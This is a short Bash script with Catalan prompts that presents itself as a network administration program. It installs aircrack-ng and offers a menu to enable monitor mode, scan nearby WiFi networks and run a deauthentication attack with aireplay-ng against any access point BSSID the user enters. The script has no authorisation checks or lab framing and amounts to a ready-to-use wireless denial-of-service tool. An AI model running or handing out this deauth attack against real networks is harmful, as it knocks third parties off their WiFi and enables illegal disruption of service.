#!/bin/bash
apt update
apt upgrade -y
apt install aircrack-ng -y

# Funció per mostrar el menú
mostrar_menu() {
    clear
    echo "Benvingut al programa d'administració de xarxes"
    echo "----------------------------------------------"
    echo "1. Posar la interfície en mode monitor"
    echo "2. Desactivar el mode monitor"
    echo "3. Escanejar xarxes WiFi"
    echo "4. Executar un atac de deauth"
    echo "5. Sortir"
    echo
}

# Funció per posar la interfície en mode monitor
posar_mode_monitor() {
    read -p "Introdueix la interfície de xarxa (p. ex., wlan0): " interface
    sudo airmon-ng start $interface
}

# Funció per desactivar el mode monitor
desactivar_mode_monitor() {
    read -p "Introdueix la interfície de xarxa (p. ex., wlan0): " interface
    sudo airmon-ng stop $interface
}

# Funció per escanejar xarxes WiFi
escanejar_xarxes() {
    read -p "Introdueix la interfície de xarxa en mode monitor (p. ex., wlan0mon): " interface
    sudo airodump-ng $interface
}

# Funció per executar un atac de deauth
executar_deauth() {
    read -p "Introdueix la interfície de xarxa en mode monitor (p. ex., wlan0mon): " interface
    read -p "Introdueix la adreça MAC de l'Access Point (BSSID): " ap_mac
    read -p "Introdueix el nombre de paquets de deauth: " num_pkts_to_send
    sudo aireplay-ng -0 $num_pkts_to_send -a $ap_mac $interface
}

# Bucle principal
while true; do
    mostrar_menu
    read -p "Selecciona una opció: " opcio
    case $opcio in
        1) posar_mode_monitor ;;
        2) desactivar_mode_monitor ;;
        3) escanejar_xarxes ;;
        4) executar_deauth ;;
        5) echo "Adeu!"; exit ;;
        *) echo "Opció no vàlida. Torna a intentar." ;;
    esac
    read -p "Prem ENTER per continuar..."
done
